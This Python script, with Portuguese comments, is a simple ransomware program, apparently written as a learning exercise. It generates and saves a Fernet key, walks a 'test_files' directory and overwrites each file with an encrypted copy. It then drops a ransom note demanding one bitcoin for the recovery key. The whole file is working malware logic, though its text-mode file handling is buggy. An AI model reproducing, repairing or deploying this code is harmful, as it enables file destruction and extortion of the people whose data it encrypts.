from cryptography.fernet import Fernet
import os

#1. Gerar chave criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva

def carregar_chave():
    return open("chave.key", "rb").read()

#3. criptografar um único arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "r") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)    
    with open(arquivo, "w") as file:    
        file.write(dados_encriptados)

#4. Buscar arquivos..

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem regate

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço x e envie o comprovante\n")
        f.write("Depois disso, enviaremos a chave de recuperação do arquivo")

#6. Execução

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados")

if __name__=="__main__":
    main()


